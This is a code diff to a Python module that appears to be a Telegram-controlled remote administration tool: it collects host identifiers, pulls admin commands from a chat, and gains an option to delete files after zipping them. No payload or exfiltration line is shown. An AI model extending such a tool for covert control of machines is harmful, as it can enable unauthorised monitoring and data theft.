@@ -10,7 +10,7 @@ import platform
 import time
 import zipfile
 
-from os import getcwd, getpid, path
+from os import getcwd, getpid, path, remove
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
@@ -191,12 +191,7 @@ def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger):
 
         if 'The remote server returned an error' in response_source:
             logger.error(
-                f'get_update_by_third_party_proxy: [False TOKEN or ADMIN_CHAT_ID] error: {response_source}')
-            return False
-
-        if 'The remote server returned an error: (400) Bad Request.' in response_source:
-            logger.error(
-                f'get_update_by_third_party_proxy: telegram api server error: {response_source}')
+                f'get_update_by_third_party_proxy: [False TOKEN , ADMIN_CHAT_ID or api data] error: {response_source}')
             return False
 
         response_source = response_source.replace("Response Content", "")
@@ -272,7 +267,7 @@ def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKE
     return message_text
 
 
-def make_zip_file(route, logger):
+def make_zip_file(route, logger, delete_input_file=False):
     '''get file route, make zip file and save to courent route \n
     return True, new_file_name |or| return False, 'None' \n
     sample: istrue, file_name = make_zip(./test.txt)
@@ -291,8 +286,13 @@ def make_zip_file(route, logger):
     try:
         with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
             zf.write(route, path.basename(route))
+
         logger.info(
             f'make_zip_file: The file was successfully zipped, file name {new_file_name}')
+
+        if delete_input_file:
+            remove(route)
+
         return True, new_file_name
 
     except Exception as error:
